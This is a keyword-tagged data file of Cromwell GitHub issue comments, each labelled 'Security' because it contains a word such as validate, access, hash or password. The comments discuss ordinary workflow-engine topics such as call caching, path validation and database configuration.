Security,"FYI- @cjllanwarne / @mcovarr: After working with the `GcsPath` tests I'm backing away from trying to figure out if a `GcsPath` is ""valid"" if it's a bucket only. Path-theory is just too complex to think about right now. Happy to give examples IRL, but mindbenders include:. - `""gs://bucket/""`; - `""gs://bucket""`; - `""gs://bucket/.""`; - `""gs://bucket/ ""`; - etc. I'll leave the validation in `GcsBatchIoCommand` though, ensuring we never issue requests to `list` instead of `get` objects.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719639906:376,validat,validation,376,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719639906,1,['validat'],['validation']
Security,"FYI: Places we allow expressions:. | Position | Notes |; | --- | --- |; | Workflow declarations | Inject a task with matching dependencies. Use ""Local"" backend... But what if Local is not configured (e.g. FC) |; | Task declarations | Use the same backend. Inject a preceeding task (maybe evaluate everything at once?) |; | Task outputs | Use the same backend We'd need to insert a new task afterwards and rewire following tasks. We'd also need to back-fill results once they're known |; | Subexpressions | In the same context as the main expression |; | Scatter signatures | Actually this one doesn't work right now (sad!) but we could probably treat them just like workflow declarations |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1618#issuecomment-256066377:98,Inject,Inject,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1618#issuecomment-256066377,2,['Inject'],['Inject']
Security,"Figuring that out is what this ticket is for :); Right now it involves at least having a cromwell available, a github access token, running the release WDL, monitoring that everything goes well and that the WDL succeeds. This could be automated using jenkins for example.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2403#issuecomment-333242328:118,access,access,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2403#issuecomment-333242328,1,['access'],['access']
Security,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:283,hash,hash,283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592,4,['hash'],['hash']
Security,"Fixed the [proof of concept code](https://github.com/broadinstitute/cromwell/compare/develop...rhpvorderman:relativeImports). Now the WOMTOOL is able to handle absolute paths correctly. I can run `java -jar /home/ruben/test/base/womtool-31-1df94fa-SNAP.jar validate /home/ruben/test/base/workflow.wdl ` in any directory on the filesystem and get the same result. However cromwell still uses $PWD to evaluate the base directory. I can see the WOMtool uses the following code to load the WDL file:; ```scala; private[this] def loadWdl(path: String)(f: WdlNamespace => Termination): Termination = {; WdlNamespace.loadUsingPath(Paths.get(path), None, None) match {; case Success(namespace) => f(namespace); case Failure(r: RuntimeException) => throw new RuntimeException(""Unexpected failure mode"", r); case Failure(t) => UnsuccessfulTermination(t.getMessage); }; }; ```; But for cromwell there does not seem to be such a straightforward loading of the wdlfile. Can somebody point me to this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3241#issuecomment-369579047:257,validat,validate,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3241#issuecomment-369579047,1,['validat'],['validate']
Security,"For the person (even if it's me) who picks this up -> I did a quick poke around and I **think** the reason for this is that our original validation in `PartialWorkflowSources` appears to be getting run through a YAML parser and tabs aren't valid YAML, but are ok in JSON.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379127391:137,validat,validation,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379127391,1,['validat'],['validation']
Security,"For those that come across this PR in the future, a subset of the [docs](https://docs.codecov.io/v4.3.6/docs) referred to in this PR:; - Commit Status; - Project Status; - [Target](https://docs.codecov.io/v4.3.6/docs/commit-status#section-target); - [Threshold](https://docs.codecov.io/v4.3.6/docs/commit-status#section-threshold); - [Base](https://docs.codecov.io/v4.3.6/docs/commit-status#section-base); - [Patch Status](https://docs.codecov.io/v4.3.6/docs/commit-status#section-patch-status); - Coverage Configuration; - [Range](https://docs.codecov.io/v4.3.6/docs/coverage-configuration#section-range); - [Rounding](https://docs.codecov.io/v4.3.6/docs/coverage-configuration#section-rounding); - Notifications; - [Slack](https://docs.codecov.io/v4.3.6/docs/notifications#section-slack); - Pull Request Comments; - [Disable comment](https://docs.codecov.io/v4.3.6/docs/pull-request-comments#section-disable-comment) (aka Github emails); - CodeCov YAML; - [Default Branch](https://docs.codecov.io/v4.3.6/docs/codecov-yaml#section-default-branch); - [Validate your repository yaml](https://docs.codecov.io/v4.3.6/docs/codecov-yaml#section-validate-your-repository-yaml)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2779#issuecomment-339091206:1052,Validat,Validate,1052,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2779#issuecomment-339091206,2,"['Validat', 'validat']","['Validate', 'validate-your-repository-yaml']"
Security,"From discussion yesterday it seems that this needs the metadata service to be implemented. There are three kinds of final calls:; - Copy workflow logs - this only needs access to filesystems in the engine. Log location is specified in the workflow options; - Copy workflow outputs - this needs filesystem access in the engine. Takes a sub-set of the call outputs and copies them.; - Copy call logs - Call logs can be different for each backend, and since this information is now being stored in the metadata service, we need some convention for which keys are valid call-log keys.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/773#issuecomment-218142957:169,access,access,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/773#issuecomment-218142957,2,['access'],['access']
Security,"From my testing, it seems that anything that runs a ""chmod""-like command disrupts the ACL-controlled permissions, leading to permission denied and/or other errors. I think if the configuration option wrapped any commands that did this, it would fix the issue. In the meantime I was able to come up with a few workarounds to fix the permissions so that we were happy with the system (moved some files around so cromwell wasn't accessing or trying to move anything past our ACL, and added a ""chmod o-wrx..."" command to my submit script), but a configuration option that did this by default would be great!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374703828:426,access,accessing,426,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374703828,1,['access'],['accessing']
Security,"From the docs, emphasis mine:. >After a successful complete request, the parts no longer exist. Your complete multipart upload request must include the upload ID and a list of both part numbers and corresponding ETag values. Amazon S3 response includes an ETag that uniquely identifies the combined object data. **This ETag will not necessarily be an MD5 hash of the object data**. [Source](https://docs.aws.amazon.com/AmazonS3/latest/dev/mpuoverview.html). Thinking out loud: Do we have to recreate the original multipart upload to get the same ETag deterministically? Or otherwise how can we get the combined ETag deterministically?. If not, we can use [UploadPartCopyRequest](http://aws-java-sdk-javadoc.s3-website-us-west-2.amazonaws.com/latest/software/amazon/awssdk/services/s3/model/UploadPartCopyRequest.html) to accomplish this [here](https://github.com/broadinstitute/cromwell/blob/b8aa5e1eee730dcd3edc2c8ff0cf0144127a3208/filesystems/s3/src/main/java/org/lerch/s3fs/S3FileSystemProvider.java#L433). [Example multipart copy using old SDK](https://docs.aws.amazon.com/AmazonS3/latest/dev/CopyingObjctsUsingLLJavaMPUapi.html); [Migration guide from 1.1 to 2.0 (to interpret above in 2.0)](https://github.com/aws/aws-sdk-java-v2/blob/master/docs/LaunchChangelog.md#41-s3-changes)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-483794865:355,hash,hash,355,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-483794865,2,['hash'],['hash']
Security,"From the point of view of the wider user community (which reaches far outside the Broad's walls), it would be difficult to justify (not to mention communicate and support) an implicit retry mechanism that would effectively override the request stated by the user in their WDL. So we would have to expose that second setting, but then that increases the technical complexity that we need to maintain and support as well. Additionally, this would be vulnerable to business decisions by Google -- for example, what if they change the no-charge duration cutoff in response to a sudden dramatic increase of retries on early-preemption jobs? . Generally speaking I believe the best thing we can do for the user community is provide a transparent way for people to understand what are the odds and tradeoff of preemption, and to control the setting depending on their time & cost constraints (ie how much they're willing to gamble).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293700592:297,expose,expose,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293700592,1,['expose'],['expose']
Security,"Full sketch of the idea as it applied to the pluggable_backends branch below. This particular ticket is concerned only with moving the DB code and having the engine be able to work with backends to determine which calls are resumable. Those might really be two separate pieces that two people could work in parallel. Cromwell would need to wake up and scan its database for Running workflows with Running calls. Something in Cromwell would then need to classify calls into resumable or not resumable. e.g. for JES, figure out if Cromwell has a JES Run ID that could be used to resume polling an already-launched JES run. Only the JES backend would know how to make this determination, but backends don’t have access to the database. So Cromwell would need to gather up representations of possibly resumable executions, examine on which backend type the executions had been running, create CallActors for each execution using a specified backend type (not a currently supported use case), and send a Restart message parameterized by the representation of the execution. The CallActor would need to create a backend of the specified type and then ask that backend if the execution is resumable. Resumable executions would result in a Resumed message making its way back to the WorkflowActor, otherwise WorkflowActor would get a NotResumable message. For NotResumable executions the WorkflowActor should be free to choose whatever backend it pleases to restart the call and shouldn’t necessarily be bound by the backend type that was chosen for the previous attempt.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/581#issuecomment-197643112:709,access,access,709,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/581#issuecomment-197643112,2,['access'],['access']
Security,Git hash: 3eb1623d9a5ffdf0fc3626820eab84ae6560b2cd,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197959558:4,hash,hash,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197959558,1,['hash'],['hash']
Security,"Glad that helped !; Regarding HSQL vs MySQL, the main reason is that we've rarely used HSQL and there may be some corner cases that we don't support (and don't know about); It probably performs better too on the long run as your DB grows.; But it's definitely good to have some feedback on how Cromwell behaves with HSQL too.; For the `null` hash, something weird is going on so I'd keep the issue open. If it's not immediately blocking you anymore it might get slightly de-prioritized but we'll definitely look into it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386700970:342,hash,hash,342,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386700970,2,['hash'],['hash']
Security,Going with CircleCI instead because it gives us full VM access instead of starting us off in a container and forcing docker-by-docker or docker-in-docker solutions,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6089#issuecomment-777656264:56,access,access,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6089#issuecomment-777656264,1,['access'],['access']
Security,Going with changing Martha to try-and-silence accessUrl generation failures.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6319#issuecomment-825204463:46,access,accessUrl,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6319#issuecomment-825204463,1,['access'],['accessUrl']
Security,"Good news! @geoffjentry is wrong, and we do not hash the cpu or memory runtime attributes. So call caching works as you want it to. These runtime attributes are hashed (and count for call caching):; * `ContinueOnReturnCode`; * `Docker`; * `FailOnStderr`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-331260390:48,hash,hash,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-331260390,2,['hash'],"['hash', 'hashed']"
Security,"Great increasing the memory was the solution. In case somebody else needs helping setting up a mysql database:. 1. Add this to the bottom of your config; ```; database { ; profile = ""slick.jdbc.MySQLProfile$"" ; db { ; driver = ""com.mysql.jdbc.Driver"" ; url = ""jdbc:mysql://localhost/DatabaseName?useSSL=false&allowPublicKeyRetrieval=true"" ; user = ""ChooseAName"" ; password = ""YourOtherPassword"" ; connectionTimeout = 5000 ; } ; }; ```; 2. Then set up the mysql database using docker; ```; sudo docker run -p 3306:3306 -e MYSQL_ROOT_PASSWORD=YourPassword -e MYSQL_DATABASE=DatabaseName -e MYSQL_USER=ChooseAName -e MYSQL_PASSWORD=YourOtherPassword -d mysql; ```. 3. Then check that your docker container is running: ; ```; sudo docker ps -a; ```. 4. Then you should be all set. Most of this is from:; https://gatkforums.broadinstitute.org/wdl/discussion/comment/51170#Comment_51170",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5347#issuecomment-573160131:364,password,password,364,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5347#issuecomment-573160131,1,['password'],['password']
Security,"Great, thanks. I originally saw this issue when running a 20000-wide Hello World scatter using mock JES. At a point when Cromwell temporarily seemed catatonic, I Control-backslashed and saw loads of engine dispatcher stack traces like the above. Mock JES is currently [broken](#1571) due to batching API changes but hopefully it will become great again soon and the #1456 changes can be validated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-254582826:387,validat,validated,387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-254582826,1,['validat'],['validated']
Security,"H. On Fri, Feb 17, 2017, 10:58 AM Thib <notifications@github.com> wrote:. > ------------------------------; > You can view, comment on, or merge this pull request online at:j; >; > https://github.com/broadinstitute/cromwell/pull/2006; > Commit Summary; >; > - fail file hashing if the file does not exist; >; > File Changes; >; > - *M*; > supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala; > <https://github.com/broadinstitute/cromwell/pull/2006/files#diff-0>; > (17); >; > Patch Links:; >; > - https://github.com/broadinstitute/cromwell/pull/2006.patch; > - https://github.com/broadinstitute/cromwell/pull/2006.diff; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/2006>, or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AFIEGBYy1Z6suJGLDtusapP1VvcT0mSfks5rdcOhgaJpZM4MEbxA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280878369:270,hash,hashing,270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280878369,1,['hash'],['hashing']
Security,"Hah, you perturbed (WOTD) the hash, the test needs to be updated",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/332#issuecomment-165262625:30,hash,hash,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/332#issuecomment-165262625,1,['hash'],['hash']
Security,"Hashes are busted in travis for some reason, but overall :+1: . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/616/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/616#issuecomment-201016504:0,Hash,Hashes,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/616#issuecomment-201016504,1,['Hash'],['Hashes']
Security,"Hello @haaskyle, we are currently using Jira for our backlog. I have moved your ticket to https://broadworkbench.atlassian.net/browse/BA-5695. Please let me know if you have issues accessing it. You will need to create a Jira account. The priority of this ticket will be reviewed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-499991087:181,access,accessing,181,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-499991087,1,['access'],['accessing']
Security,"Hello, I am new to WDL and have met the same problem recently. I defined a `struct` like this:; ```; struct Fastp {; File reportHtml; File reportJson; Array[File]+ fqs; }; ```; and try to return it as the output in a `task`:; ```; output {; Fastp out = {; ""reportHtml"": ""QC/fastp.html"",; ""reportJson"": ""QC/fastp.json"",; ""fqs"": if flag then [""QC/clean_1.fq.gz"",""QC/clean_2.fq.gz""] else [""QC/clean_1.fq.gz""]; }; }; ```; `womtool validate` was applied to check the language specification and everything went fine, but finally got the error when trying to run my workflow using Cromwell. Here is part of the error report:; ```; java.lang.UnsupportedOperationException: Cannot construct WomMapType(WomStringType,WomAnyType) with mixed types in map values: [WomString(QC/fastp.html), WomString(QC/fastp.json), [""QC/clean_1.fq.gz"", ""QC/clean_2.fq.gz""]]; ``` ; Any solution to this problem now?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4663#issuecomment-885644093:427,validat,validate,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4663#issuecomment-885644093,1,['validat'],['validate']
Security,"Hello, I posted this bug because the validator does NOT do a check. IE I run the validator on every WDL I submit, but the validator did not catch this error. The error happens, as you said, after many tasks have run already.; [wot.wdl.txt](https://github.com/broadinstitute/cromwell/files/2168605/wot.wdl.txt)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402886702:37,validat,validator,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402886702,3,['validat'],['validator']
Security,"Here is a slightly more general script (it assumes the lock file and saved image are in the current directory). It also does the pull into a temp file with a rename into the destination name at the end so that for a large image the -f check won't trigger for a partial download. I do some work here to deduce a filename that should match (as I understand the rules anyway) the one that the pull would create. I also include an option to force the path, since in my automation I tend to wish to define everything for my self. The derived or given image filename is echoed at the end. YOUR_HOST is the name of the sregistry host (this is the context I'm doing this in). ```; #!/bin/bash . lock_dir=. if [[ $# -ne 1 && $# -ne 2 ]] ; then; echo ""Usage: $0 image-name [output-file]"" 1>&2; exit 1; fi; name=$1; output_file=$2. if [[ ""$output_file"" = """" ]] ; then. # deduce filename . output_file=`basename $name`; if [[ $output_file =~ (.*):([^:]+)$ ]] ; then; base=${BASH_REMATCH[1]}; tag=${BASH_REMATCH[2]}; else; base=$output_file; tag=latest; fi; output_file=""${base}_$tag.sif""; fi. url=shub://YOUR_HOST/$name. # declare a very similar path (.lock) where Cromwell can access ; lock=$lock_dir/$output_file.lock; tmp=$output_file.tmp. if [ ! -f ""$output_file"" ]; then # If we already have the image, skip everything ; (; flock --exclusive 200; if [ ! -f ""$output_file"" ]; then # do a second check once the lock has been released ; singularity pull --nohttps $tmp $url; mv $tmp $output_file; fi; ) 200>$lock; fi. rm -f $lock. echo $output_file; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537238921:1166,access,access,1166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537238921,1,['access'],['access']
Security,"Here is the config file used for the above. ```; ﻿include required(classpath(""application"")). ""workflow_failure_mode"": ""ContinueWhilePossible"". webservice {; port = 2525; }. system.file-hash-cache=true. system {; job-rate-control {; jobs = 1; per = 2 second; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; # driver = ""com.mysql.jdbc.Driver""; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://xxxxxx:xxxx/xxx?rewriteBatchedStatements=true&useSSL=false""; user = ""xxx""; password = ""xxx""; connectionTimeout = 120000; }; }. aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; {; name = ""assume-role-based-on-another""; scheme = ""assume_role""; base-auth = ""default""; role-arn = ""arn:aws:iam::xx:role/xxx""; }; ]; // diff 1:; # region = ""us-west-2"" // uses region from ~/.aws/config set by aws configure command,; # // or us-east-1 by default; }; engine {; filesystems {; s3 {; auth = ""assume-role-based-on-another""; }; }; }; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; // Base bucket for workflow executions; root = ""s3://xxx/cromwell-output""; // A reference to an auth defined in the `aws` stanza at the top. This auth is used to create; // Jobs and manipulate auth JSONs.; auth = ""default""; // diff 2:; numSubmitAttempts = 1; // diff 3:; numCreateDefinitionAttempts = 1; default-runtime-attributes {; queueArn: ""arn:aws:batch:us-west-2:xxx:job-queue/xxx""; }; filesystems {; s3 {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""default""; }; }; }; }; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4805#issuecomment-480408020:186,hash,hash-cache,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4805#issuecomment-480408020,2,"['hash', 'password']","['hash-cache', 'password']"
Security,"Here is the terminal output, for posterity:. The first command with internet, confirms we are using a cached image:; ```bash; $ singularity exec docker://busybox ls; INFO: Using cached SIF image; CHANGELOG.md LICENSE README.md dist paper qme.egg-info setup.py; Dockerfile MANIFEST.in build docs qme setup.cfg tests; ```; then I took off my wireless :scream: and ran the same - we know the image is in the cache:. ```bash; $ singularity exec docker://busybox ls; FATAL: Unable to handle docker://busybox uri: failed to get checksum for docker://busybox: error pinging docker registry registry-1.docker.io: Get https://registry-1.docker.io/v2/: dial tcp: lookup registry-1.docker.io: no such host; ```; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631206046:522,checksum,checksum,522,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631206046,1,['checksum'],['checksum']
Security,"Here's a log for a similar workflow that had the same issue but recovered after restart. ```; 2017-02-13 16:50:09,104 INFO - MaterializeWorkflowDescriptorActor [UUID(3d01da76)]: Call-to-Backend assignments: test.hello -> JES; 2017-02-13 16:50:09,534 INFO - JES [UUID(3d01da76)]: Creating authentication file for workflow 3d01da76-98f9-4751-a3c0-efc61ef67030 at ; gs://cromwell-auth-broad-dsde-alpha/3d01da76-98f9-4751-a3c0-efc61ef67030_auth.json; 2017-02-13 16:50:10,063 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Starting calls: test.hello:NA:1; 2017-02-13 16:50:11,006 INFO - JesRun [UUID(3d01da76)test.hello:NA:1]: JES Run ID is operations/EJ7jhsOjKxiXht2Ej-qXrHAg9vy4-dodKg9wcm9kdWN0aW9uUXVldWU; 2017-02-13 16:50:11,006 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: job id: operations/EJ7jhsOjKxiXht2Ej-qXrHAg9vy4-dodKg9wcm9kdWN0aW9uUXVldWU; 2017-02-13 16:50:16,621 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from - to Initializing; 2017-02-13 16:51:01,890 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Initializing to Running; 2017-02-13 16:51:38,243 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Running to Success; 2017-02-13 16:51:38,977 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""gs://fc-cd1f5468-d0f9-4416-8cdc-9464482022dd/8ee1f938-a92c-48df-a4cc-7a0683413547/test/3d01da76-98f9-4751-a3c0-efc61ef67030/call-hello/hello-stdout.log""; }; 2017-02-13 16:51:39,178 INFO - $f [UUID(3d01da76)]: Copying workflow logs from /cromwell-workflow-logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279495953:288,authenticat,authentication,288,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279495953,1,['authenticat'],['authentication']
Security,"Here's another repro. We had a new database whose firewall wasn't set up to let this particular Cromwell instance talk to it. Cromwell starts up and appears to be running but there isn't any mention in the log that there's a problem - and we don't get to the ""Running with database"" <connection string> log line. It just quietly fails.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1128#issuecomment-231123371:50,firewall,firewall,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1128#issuecomment-231123371,1,['firewall'],['firewall']
Security,"Here's the metadata; ```; {; ""workflowName"": ""MarkDuplicates"",; ""calls"": {; ""MarkDuplicates.SortSam"": [; {; ""executionStatus"": ""Done"",; ""backendStatus"": ""Success"",; ""shardIndex"": -1,; ""jes"": {; ""instanceName"": ""ggp-8929414080671740740"",; ""machineType"": ""us-east1-d/n1-highmem-4"",; ""zone"": ""us-east1-d""; },; ""outputs"": {; ""outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-SortSam/md.sorted.bam""; },; ""callCaching"": {; ""hashes"": {; ""output count"": ""C4CA4238A0B923820DCC509A6F75849B"",; ""runtime attribute"": {; ""docker"": ""727DC68A78243A55A510496DBD51C8FD"",; ""continueOnReturnCode"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327""; },; ""output expression"": {; ""File outBam"": ""51E81723BF4AE3737FA7A05AD3C404E0""; },; ""input count"": ""A87FF679A2F3E71D9181A67B7542122C"",; ""backend name"": ""5BAA79C7C5A573C899A61D342AA00484"",; ""command template"": ""7F303905B5A7C3C5E133EEA5D655F93F"",; ""input"": {; ""String docker"": ""5FFD9AB91DECDD52945847CAED219F0A"",; ""String outputName"": ""A3830295D56B220883B7627EB49D6ECD"",; ""String sortOrder"": ""D68E1AF2DA2A70598DD21717D8621A4C"",; ""File bam"": ""WRKp1w==""; }; }; },; ""returnCode"": 0,; ""end"": ""2018-04-04T06:49:15.680Z"",; ""dockerImageUsed"": ""us.gcr.io/broad-gatk/gatk@sha256:fd8e7a9e65e6a981ab3b92305492d54c3baef7a803ec3fcb895e5ebeedf824e7"",; ""attempt"": 1,; ""executionEvents"": [; {; ""startTime"": ""2018-04-04T03:54:17.587Z"",; ""description"": ""Pending"",; ""endTime"": ""2018-04-04T03:54:17.587Z""; },; {; ""startTime"": ""2018-04-04T06:49:04.424457737Z"",; ""description"": ""cromwell poll interval"",; ""endTime"": ""2018-04-04T06:49:12.726Z""; },; {; ""startTime"": ""2018-04-04T06:49:12.726Z"",; ""description"": ""UpdatingCallCache"",; ""endTime"": ""2018-04-04T06:49:14.698Z""; },; {; ""startTime"": ""2018-04-04T03:54:17.588Z"",; ""description"": ""PreparingJob"",; ""endTime"": ""2018-04-04T03:54:17.593Z""; },; {; ""startTime"": ""2018-04-04T06:35:13.639652324Z"",; ""description"": ""delocalizing-files"",; ""endTime"": ""2",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328:482,hash,hashes,482,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328,1,['hash'],['hashes']
Security,Here's the pullapprove audit: https://pullapprove.com/broadinstitute/cromwell/pull-request/3505/reviews/,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3505#issuecomment-382572389:23,audit,audit,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3505#issuecomment-382572389,1,['audit'],['audit']
